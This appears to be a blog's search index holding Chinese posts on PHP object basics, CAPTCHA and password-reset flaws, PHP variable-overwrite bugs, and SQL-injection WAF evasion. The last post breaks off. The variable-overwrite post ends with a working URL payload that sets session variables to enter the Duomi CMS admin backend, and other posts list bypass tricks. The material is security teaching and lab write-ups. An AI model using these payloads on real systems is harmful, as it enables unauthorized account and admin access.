<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>php面向对象1</title>
      <link href="/2020/05/28/php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A11/"/>
      <url>/2020/05/28/php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A11/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="类和对象的关系"><a href="#类和对象的关系" class="headerlink" title="类和对象的关系"></a>类和对象的关系</h1><h2 id="类的概念"><a href="#类的概念" class="headerlink" title="类的概念"></a>类的概念</h2><p>​         类就是==分类、类别、模板、概念==等，类是无形的、看不见、摸不着，不实际存在的。</p><pre><code>类是==**具有相同属性(特征)和行为(动作)的一组对象的集合**==，它为属于该类的全部对象提供了统一的抽象描述，其内部包括属性和行为两个主要部分。例如：所有在学校学习的人，具有相同的属性：学号、姓名、性别等；具有相同的行为：学习。所以，这些人构成一个类，即学生类。</code></pre><h2 id="对象的概念"><a href="#对象的概念" class="headerlink" title="对象的概念"></a>对象的概念</h2><p>​        客观世界中任何一个事物都可以看成一个对象，对象看得见、摸得着，实际存在的。<br>​        对象是构成系统的基本单位。==任何一个对象都应具有这两个要素：属性(Attribute)和行为(Behavior)。==例如：学生“张三”是一个对象，他有属性：学号、姓名、性别等；行为有：学习、吃饭等。<br>​        对象来自于某个类，对象不能单独存在。==一个类可以产生千千万万个对象。==<br>​        对象和类的关系是，对象是类的实例，类是对象的模板。</p><p>​        ==类是抽象的，几乎不占用内存，而对象是具体的，占用存储空间。==</p><h1 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h1><h2 id="类的定义语法格式"><a href="#类的定义语法格式" class="headerlink" title="类的定义语法格式"></a>类的定义语法格式</h2><p>==类和函数一样，都是代码的封装方式。==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528185251.png" alt="" loading="lazy"></p><h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528185318.png" alt="" loading="lazy"></p><h1 id="类的成员属性定义"><a href="#类的成员属性定义" class="headerlink" title="类的成员属性定义"></a>类的成员属性定义</h1><h2 id="成员属性介绍"><a href="#成员属性介绍" class="headerlink" title="成员属性介绍"></a>成员属性介绍</h2><p>类的成员属性，就是指某个类具有的公共的特征、特性；</p><p>==类中定义的变量，就是类的成员属性；==</p><p><strong>类的成员属性和普通变量的区别：类的成员属性必须要带==权限修饰符==，而普通变量不需要</strong></p><h2 id="权限修饰符"><a href="#权限修饰符" class="headerlink" title="权限修饰符"></a>权限修饰符</h2><p><strong>==成员属性必须要加权限修改符，否则报错。==</strong></p><p>public(公共权限)：在任何地方都可以访问，主要包括：类外、本类中、子类中都可以访问。</p><p>private(私有权限)：只能在本类中被访问，在类外和子类中都无权访问。</p><p>protected(受保护的权限)：只能在本类中和子类中被访问，在类外不能被访问。</p><p><strong>举例说明</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528185620.png" alt="" loading="lazy"></p><h1 id="类的成员方法定义"><a href="#类的成员方法定义" class="headerlink" title="类的成员方法定义"></a>类的成员方法定义</h1><h2 id="成员方法介绍"><a href="#成员方法介绍" class="headerlink" title="成员方法介绍"></a>成员方法介绍</h2><p>==类的方法，就是某个类的公共的的行为或动作；==</p><p>==类的成员方法，与普通函数一样，都有返回值和参数；==</p><p><strong>==成员方法与普通函数区别：成员方法只能存在于类中，成员方法定义前可以添加访问权限修饰符；==</strong></p><p>提示：==成员方法可以省略权限修饰符，默认访问权限是public。==</p><p><strong>举例说明</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528185837.png" alt="" loading="lazy"></p><h1 id="创建类的实例对象"><a href="#创建类的实例对象" class="headerlink" title="创建类的实例对象"></a>创建类的实例对象</h1><h2 id="实例化对象的含义"><a href="#实例化对象的含义" class="headerlink" title="实例化对象的含义"></a>实例化对象的含义</h2><p>定义类是为了生产对象，如果不生产对象，类就没有意义。</p><p>一个类可以产生千千万万个对象，对象帮我们干活。</p><p>对象实例化：从一个类上来生产对象过程，就是类的实例化。</p><h2 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h2><p>使用new关键字来创建对象。</p><p>==JS创建对象的方法：var today = new Date()==</p><p>==PHP创建对象的方法：$obj = new Student()==</p><p><strong>举例说明</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528190015.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528190026.png" alt="" loading="lazy"></p><h1 id="对象属性操作"><a href="#对象属性操作" class="headerlink" title="对象属性操作"></a>对象属性操作</h1><h2 id="如何访问对象的属性和方法？"><a href="#如何访问对象的属性和方法？" class="headerlink" title="如何访问对象的属性和方法？"></a>如何访问对象的属性和方法？</h2><p>==在JS中，访问对象属性和方法，是通过”<strong>.</strong>“来访问的。例如：window.alert()、arrObj.length==</p><p>==在PHP中，访问对象属性和方法，是通过”<strong>-&gt;</strong>“来访问的。例如：$obj-&gt;name、$obj-&gt;showInfo()==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528190205.png" alt="" loading="lazy"></p><h2 id="对象属性的操作"><a href="#对象属性的操作" class="headerlink" title="对象属性的操作"></a>对象属性的操作</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528190246.png" alt="" loading="lazy"></p><h1 id="对象方法操作"><a href="#对象方法操作" class="headerlink" title="对象方法操作"></a>对象方法操作</h1><p>对象方法的操作：方法定义、方法调用、传递参数、方法返回值。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528190319.png" alt="" loading="lazy"></p><h1 id="伪变量-this的使用"><a href="#伪变量-this的使用" class="headerlink" title="伪变量$this的使用"></a>伪变量$this的使用</h1><h2 id="伪变量-this的含义"><a href="#伪变量-this的含义" class="headerlink" title="伪变量$this的含义"></a>伪变量$this的含义</h2><p>==在JS中，使用this关键字来代替当前对象==，例如：this.src = ‘./a.jpg’</p><p>==在PHP中，使用$this变量来代替当前对象==，例如：$this-&gt;name = ‘张三’</p><p>$this代表当前对象，是到当前对象的一个引用；</p><p>$this更像是一个对象指针，指向当前对象；</p><p>$this只能用在对象方法定义中，去调用对象的成员属性或成员方法。</p><p>只有创建对象后，$this变量才存在。类不会自动运行。</p><p><strong>举例说明</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528190455.png" alt="" loading="lazy"></p><h1 id="类常量的定义"><a href="#类常量的定义" class="headerlink" title="类常量的定义"></a>类常量的定义</h1><h2 id="类常量介绍"><a href="#类常量介绍" class="headerlink" title="类常量介绍"></a>类常量介绍</h2><p>可以把在类中始终保持不变的值定义为常量，例如：圆周率、班级名称等。</p><p>常量的值必须是一个定值，不能修改，也不能删除；</p><p>类常量就是类的常量，是与类相关的，与对象无关。</p><p>类常量在内存中只有一份，不管创建多少个对象。</p><p>类常量可以极大节省服务器内存，可以被所有对象去共享</p><h2 id="类常量定义和调用格式"><a href="#类常量定义和调用格式" class="headerlink" title="类常量定义和调用格式"></a>类常量定义和调用格式</h2><p>==类常量没有权限，只有属性和方法才会有权限。==</p><p>使用==<strong>const</strong>==来定义类的常量(局部常量)，只能在局部作用域下使用；==define()定义常量是全局常量，在任何地方都可以使用。==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528190832.png" alt="" loading="lazy"></p><p><strong>举例说明</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528190859.png" alt="" loading="lazy"></p><h1 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h1><h2 id="什么是构造方法"><a href="#什么是构造方法" class="headerlink" title="什么是构造方法"></a>什么是构造方法</h2><p>当使用new关键字创建对象时，==第1个自动调用的方法，就是构造方法==；</p><p>构造方法的名称是==固定的==：<strong><code>void __construct ([ mixed $args [, $... ]] )</code></strong></p><p>==构造方法可以带参数，也可以不带参数；构造方法不是必须的，是可选的==；</p><p>==构造方法的作用：对象初始化==。例如：==给对象属性赋值、数据库对象初始化(连接、选择数据库)==</p><p>==构造方法一定是成员方法。==构造方法的权限可以自己指定。</p><p>构造方法一般不需要主动调用，都是自动调用的。</p><p><strong>举例说明</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528191053.png" alt="" loading="lazy"></p><h1 id="析构方法"><a href="#析构方法" class="headerlink" title="析构方法"></a>析构方法</h1><h2 id="什么是析构方法"><a href="#什么是析构方法" class="headerlink" title="什么是析构方法"></a>什么是析构方法</h2><p>==对象销毁前自动调用的方法，就是析构方法==；</p><p>析构方法的名称是==固定的==：<strong><code>void __destruct ( void )</code></strong></p><p>==析构方法不带任何参数==；</p><p>析构方法一定是成员方法。</p><p>==析构方法的作用：垃圾回收工作，例如：断开到MySQL的连接==</p><h2 id="对象何时销毁"><a href="#对象何时销毁" class="headerlink" title="对象何时销毁"></a>对象何时销毁</h2><p><strong>==网页执行完毕时，对象会自动销毁==；</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528191222.png" alt="" loading="lazy"></p><p>==<strong>使用unset()函数手动销毁对象</strong>==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528191241.png" alt="" loading="lazy"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>验证码绕过、密码找回漏洞</title>
      <link href="/2020/05/28/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/05/28/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、验证码作用"><a href="#一、验证码作用" class="headerlink" title="一、验证码作用"></a>一、验证码作用</h1><ul><li>验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，<strong>是一种区分用户是计算机还是人的公共全自动程序。</strong></li><li><strong>验证码分两种：</strong><ol><li>验证码是一种区分用户是计算机还是人的公共全自动程序（比如登陆的时候要填写的）</li><li>识别身份，比如短信验证码、电话验证码、邮箱验证码</li><li>可以防止：<strong>恶意破解密码、刷票、论坛灌水，有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试</strong>，实际上用验证码是现在很多网站通行的方式，我们利用比较简易的方式实现了这个功能。<pre><code>![](https://gitee.com/ghat/blogimage/raw/master/img/20200320143513.png)</code></pre></li></ol></li></ul><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200320143715.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200320143752.png" alt="" loading="lazy"></p><h1 id="二、常见的验证码绕过"><a href="#二、常见的验证码绕过" class="headerlink" title="二、常见的验证码绕过"></a>二、常见的验证码绕过</h1><ol><li><p>前端验证验证码，并没有后端验证。<u>直接抓包然后进行跑数据包，反正有没有验证码的阻碍</u></p></li><li><p>验证码设置了但是并没有效验，乱输验证码也能够成功的登录（估计老板没给开发工资吧）</p></li><li><p><strong>验证码可以重复使用，<u>比如现在的验证码1111，然后虽然你登录失败后验证码会变，但是你输入1111他却判定你验证码正确（常见）==（wooyun-2016-0169672）==</u></strong></p></li><li><p>.<strong>验证码空值绕过，比如，<u>我们现在抓一个包，发现登录参数是user=admin&amp;password=admin&amp;yzm=4123。 yzm验证码参数，但是我们如果去掉yzm的传参我们就可以绕过验证码机制，直接传参user=admin&amp;password=admin，验证码就失效了</u></strong></p></li><li><p>验证码可控制，<u>比如他的验证码包含在URL里面，是一个URL传参，我们可以把URL设置定，那么验证码可控制</u></p></li><li><p>验证码有规则，比如是<u>时间戳的后6位（rand函数进行随机数）</u></p></li><li><p>有万能验证码，验证码无论是什么，只要输入000000或者 888888就能直接绕过</p></li><li><p>验证码有的时候会藏在cookie里面，分析一下是不是存在验证码的参数,<u>查看cookie参数里有没有相应的值(验证码或相应参数名)</u></p><p>==wooyun-2015-0150406==</p></li></ol><h1 id="三、密码找回漏洞"><a href="#三、密码找回漏洞" class="headerlink" title="三、密码找回漏洞"></a>三、密码找回漏洞</h1><ul><li><p>有一类验证码，他并不是区分用户是计算机还是人的公共全自动程序，他是用来证明你的身份的，比如你登录微信，支付宝，支持短信验证码登录，像这类验证码他实际上是用来区分你的身份的。</p></li><li><p>当你QQ密码忘记密码的时候，你需要找回密码，然后他要求把APP显示的动态密码填入框里面，一般而言手机验证码时间都有5-30分钟，如果他没有做尝试限制的话我们是不是可以进行穷举？然后直接跑出验证码然后就修改他人密码呢？</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200320144912.png" alt="" loading="lazy"></p></li></ul><h4 id="列："><a href="#列：" class="headerlink" title="列："></a>列：</h4><ul><li>第一种就是找回密码，往邮箱发送明文或密文的密码或者验证码（手机短信验证就是往你手机号码发验证码）通过这样的方法来判断是否是本人</li></ul><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200320145145.png" alt="" loading="lazy"></p><ul><li><p>第二种发送一个重置密码的链接到邮箱</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200320145228.png" alt="" loading="lazy"></p><h3 id="上述的密码找回方法会有什么样的漏洞呢？"><a href="#上述的密码找回方法会有什么样的漏洞呢？" class="headerlink" title="上述的密码找回方法会有什么样的漏洞呢？"></a>上述的密码找回方法会有什么样的漏洞呢？</h3><ol><li><p>验证码发送后前端返回==（wooyun-2016-0172266）==</p></li><li><p>验证码无次数限制可爆破</p></li><li><p>验证码可控==（wooyun-2014-086716）==</p></li><li><p>直接修改密码页面==（wooyun-2013-040908）==</p></li><li><p>缺失的身份认证–&gt;绑定别人的账号到自己的手机 ==（wooyun-2013-016896）==</p></li><li><p>越权漏洞–&gt;自己验证码通过改包然后修改他们密码  </p></li></ol></li></ul><h3 id="在注册之前，通过预先设定一个密保问题，忘记密码时，通过此密保进行认证，认证成功进入密码修改页面。"><a href="#在注册之前，通过预先设定一个密保问题，忘记密码时，通过此密保进行认证，认证成功进入密码修改页面。" class="headerlink" title="在注册之前，通过预先设定一个密保问题，忘记密码时，通过此密保进行认证，认证成功进入密码修改页面。"></a>在注册之前，通过预先设定一个密保问题，忘记密码时，通过此密保进行认证，认证成功进入密码修改页面。</h3><ul><li>密保问题可能容易直接被猜测 （比如很多学校的知道学号和身份证号码就可以重置校园通的密码）</li><li>密保问题答案页面中显示（数据包里面可能自带了密保答案，可能在JS里面）</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖</title>
      <link href="/2020/05/28/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
      <url>/2020/05/28/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、什么是变量覆盖？"><a href="#一、什么是变量覆盖？" class="headerlink" title="一、什么是变量覆盖？"></a>一、什么是变量覆盖？</h1><p>​    ==变量覆盖指的是可以用我们的传参值替换程序原有的变量值==</p><h4 id="经常导致变量覆盖漏洞场景有"><a href="#经常导致变量覆盖漏洞场景有" class="headerlink" title="经常导致变量覆盖漏洞场景有"></a>经常导致变量覆盖漏洞场景有</h4><ul><li>$$使用不当</li><li>extract()函数使用不当</li><li>parse_str()函数使用不当</li><li>import_request_variables()使用不当</li><li>开启了全局变量注册等（不常见）</li></ul><p>变量覆盖漏洞有的时候可以直接让我们获取Webshell，拿到服务器的权限</p><h1 id="二、函数解析"><a href="#二、函数解析" class="headerlink" title="二、函数解析"></a>二、函数解析</h1><p><strong>经常引发变量覆盖漏洞的函数有：extract() ，parse_str()，import_request_variables()</strong></p><h4 id="extract-函数："><a href="#extract-函数：" class="headerlink" title="extract()函数："></a>extract()函数：</h4><p>作用：将数组中将变量导入到当前的符号表,==该函数使用数组键名作为变量名，使用数组键值作为变量值。==针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><p>给一个实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"1"</span>;</span><br><span class="line">$my_array = <span class="keyword">array</span>(<span class="string">"a"</span> =&gt; <span class="string">"Cat"</span>,<span class="string">"b"</span> =&gt; <span class="string">"Dog"</span>, <span class="string">"c"</span> =&gt; <span class="string">"Horse"</span>);</span><br><span class="line">extract($my_array);<span class="comment">//将my_array的数组里的键值 "Cat"、"Dog" 和 "Horse" 赋值给变量 $a、$b和$c</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\$a = $a; \$b = $b; \$c = $c"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：<code>$a = Cat; $b = Dog; $c = Horse</code></p><h5 id="一道CTFextract-函数的题："><a href="#一道CTFextract-函数的题：" class="headerlink" title="一道CTFextract()函数的题："></a>一道CTFextract()函数的题：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$test=*****;</span><br><span class="line">extract($_GET);<span class="comment">//可以通过get传参：gift=a进入数组—&gt;再由extract()函数将$gift=a</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($gift))&#123;</span><br><span class="line">    $content = trim($test);<span class="comment">//trim()去除两边的空格</span></span><br><span class="line">    <span class="keyword">if</span>($gift==$content)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'flag is:'</span>.$flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> error</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析源码我们可以知道：</p><ol><li><p>文件将get方法传输进来的值通过extrace()函数处理。</p></li><li><p>通过两个if语句分别判断是否存在gift变量，和变量gift的值和变量content的值是否相等。变量content的值是通过读取变量test的值获取到的。如果两个变量相等输出flag。如果不相等，输出错误。</p></li><li><p>==似乎逻辑上没啥问题，但是如果我们传参了test呢？==</p></li><li><p>==<strong>第一开始test在php中已经定义了，但是因为extrace()函数，我传参test时相当于重新给test赋值</strong>==,因为php执行语句是自上而下，那我传的参数完全可以覆盖掉之前所定义的</p></li><li><p>==那么当我传参gift=a&amp;test=a，相当于<code>$gift=a;$test=a</code>==</p></li><li><p>==那么这里是不是就直接输出flag了呢 （因为<code>$content</code>是由<code>$test</code>决定，​<code>$gift</code>和<code>$test</code>都是我可以决定的）==</p></li></ol><h4 id="parse-str-函数："><a href="#parse-str-函数：" class="headerlink" title="parse_str()函数："></a>parse_str()函数：</h4><p>作用：把查询字符串解析到变量中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">parse_str(<span class="string">"name=zkaq&amp;&amp;age=60"</span>);</span><br><span class="line"><span class="keyword">echo</span> $name.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $age;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出了zkaq和60 </p><p>那么parse_str(“name=Bill&amp;age=60”) 相当于完成了<code>$name =&#39;zkaq&#39;</code>和<code>$age =&#39;60&#39;</code></p><p><strong>注释：</strong>如果未设置 <em>array</em> 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p><p><strong>注释：</strong>php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号$$:"></a>特殊符号$$:</h3><p>​    $$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的值作为变量的值。因此就产生了变量覆盖漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;<span class="comment">//foreach键值遍历</span></span><br><span class="line"><span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key=&gt;$_value) </span><br><span class="line">&#123;$$_key=addslashes($_value);&#125;&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li><p>单引号（’）</p></li><li><p>双引号（”）</p></li><li><p>反斜杠（\）</p></li><li><p>NULL</p></li></ul><p>这个代码会接受我们的GET提交、POST提交、COOKIE参数，将这个接受来的参数依次放入``$_request`</p><p> <code>$_key=&gt;$_value</code> 这是个数组解析，实际上就是键值分离</p><p>==正常而言<code>$a = 1</code>是一个定值，但是因为​<code>$$_key</code>的缘故,当我传参<code>a=2</code>;那么<code>$$_key=addslashes($_value);</code>就变为了<code>$a = 2</code>==</p><h1 id="三、靶场实战"><a href="#三、靶场实战" class="headerlink" title="三、靶场实战"></a>三、靶场实战</h1><p>靶场使用了多米cms2.0</p><p><strong>通过我们的seay审计工具，我们快速的发现了一个存在变量覆盖的地方（duomiphp\common.php文件）</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $_request)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_k =&gt; $_v) $&#123;$_k&#125; = _RunMagicQuotes($_v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200331220847.png" alt="" loading="lazy"></p><p><strong>使用这个变量覆盖需要满足的条件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $_k=&gt;$_v)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( strlen($_k)&gt;<span class="number">0</span> &amp;&amp; m_eregi(<span class="string">'^(cfg_|GLOBALS)'</span>,$_k) &amp;&amp; !<span class="keyword">isset</span>($_COOKIE[$_k]) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'Request var not allow!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>必须要有传参 </p></li><li><p>键名不能有cfg_和GLOBALS _</p></li><li><p>COOKIE传参中不能有$_k</p><p>(满足其中一个)</p></li></ol><p><strong>我们很明确的知道了，common.php文件存在变量覆盖，那么我们去看下什么文件调用了他</strong></p><p>在登录的页面调用了该文件，我们去login.php去看看，这个页面似乎还调用了check.admin.php</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200331221417.png" alt="" loading="lazy"></p><p><strong>通过看check.admin.php这个文件的备注，就能知道这个文件是控制session的，==可以控制权限、id、用户名==</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200331221917.png" alt="" loading="lazy"></p><p><strong>通过这里可以设置session值进行赋值来获得权限，==groupid==是权限的意思，我们全文一搜索，轻松的发现</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200331222505.png" alt="" loading="lazy"></p><p><strong>要对session传参必需开启session_start才行平且包含有common.php</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200331222921.png" alt="" loading="lazy"></p><p><strong>最后可用下面传参直接进入后台</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface&#x2F;comment.php?_SESSION[duomi_group_id]&#x3D;1&amp;_SESSION[duomi_admin_id]&#x3D;1&amp;_SESSION[duomi_admin_name]&#x3D;admin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200331223434.png" alt="" loading="lazy"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WAF绕过(sql注入)</title>
      <link href="/2020/05/28/WAF%E7%BB%95%E8%BF%87(sql%E6%B3%A8%E5%85%A5)/"/>
      <url>/2020/05/28/WAF%E7%BB%95%E8%BF%87(sql%E6%B3%A8%E5%85%A5)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、什么是bypass"><a href="#一、什么是bypass" class="headerlink" title="一、什么是bypass?"></a>一、什么是bypass?</h1><h3 id="什么是WAF"><a href="#什么是WAF" class="headerlink" title="什么是WAF:"></a>什么是WAF:</h3><ul><li><p>WAF是一个缩写，他的全名叫做Web应用防护系统(Web Application Firewall),是通过通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p></li><li><p>在互联网快速发展的今天，网站安全问题屡见不鲜，于是乎WAF类产品开始走红。</p></li><li><p>WAF有硬件类型的也有软件类型的，但是其实在我看来，从绕过WAF机制上来说，区别不大。我们一般渗透测试都会遇到软WAF，因为硬件WAF价格有点昂贵，正常企业不会购买，所以基本上是GOV站点或者国网、运营商等国企才会大规模装配。</p></li><li><p>来看看常见的软WAF，常见：安全狗、云锁、悬镜、护卫神、云盾</p></li></ul><h3 id="Bypass是什么？"><a href="#Bypass是什么？" class="headerlink" title="Bypass是什么？"></a>Bypass是什么？</h3><ul><li>Bypass他就是绕过的意思呀，我们渗透测试人员通过特殊语句的构建进行渗透测试，然后达到绕过WAF的手法</li></ul><h1 id="二、WAF检测机制"><a href="#二、WAF检测机制" class="headerlink" title="二、WAF检测机制"></a>二、WAF检测机制</h1><p><strong>WAF检测机制其实很简单，==核心就是正则匹配==，(就是你们学过的正则匹配)，虽然说还有字符串强行匹配，还有什么语义解析，但是实际上还是正则居多。</strong></p><h3 id="一个CMS的自带防护机制"><a href="#一个CMS的自带防护机制" class="headerlink" title="一个CMS的自带防护机制:"></a>一个CMS的自带防护机制:</h3><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200324201803.png" alt="" loading="lazy"></p><h1 id="三、常见绕WAF手法"><a href="#三、常见绕WAF手法" class="headerlink" title="三、常见绕WAF手法"></a>三、常见绕WAF手法</h1><p>​     <strong>安全和客户体验都是需要平衡的，特别是对于WAF而言，你想想，用了WAF之后，然后网页动不动就拦截，比如我是用户，然后因为我用户名叫and然后我就被拉黑了，因为我不小心输了个’页面就出问题，这个当然不可以，所以WAF一般都是通用的，并不是单独定制的，既然是通用的，那么他在拦截上会比较谨慎，所以WAF的正则一般是搭配式的。</strong></p><p><strong>知道WAF通过正则匹配,替换函数试试</strong></p><ul><li><p>例如：id=1 and 1=1</p><p>WAF对and 进行了拦截，那么我们是不是得尝试找到替换and的东西，那么运算符就能帮上我们，例如:&amp;</p><p>但是输入时候我们发现如果只写 and 是不会被拦截的，那么我们想办法改一改1=1，可以试试-1=-1 </p><p>甚至例如直接传参，我使用加减符号，乘除符号运算，或者是字符串传参直接用16进制也可以绕过这个傻狗</p></li></ul><p><strong>内联注释</strong></p><ul><li>内联注释是MySQL为了保持与其他数据兼容，将==MySQL中特有的语句放在/*!…<em>/中==，这些语句在不兼容的数据库中不执行，而在MySQL自身却能识别，执行。==/</em>!50001*/表示数据库版本&gt;=5.00.01时中间的语句才能被执行==（可通过burp爆破出可绕过并且可执行的序列）</li></ul><h3 id="常见手法"><a href="#常见手法" class="headerlink" title="常见手法:"></a>常见手法:</h3><ul><li><strong>大小写绕过 （很老的WAF才有用）</strong></li></ul><ul><li><strong>替换绕过 （很老的WAF才有用）【和上传文件那个pphphp一样】</strong></li></ul><ul><li><p><strong>特殊字符绕过 （%0a换行或``）</strong></p><ul><li><pre><code>? id=1 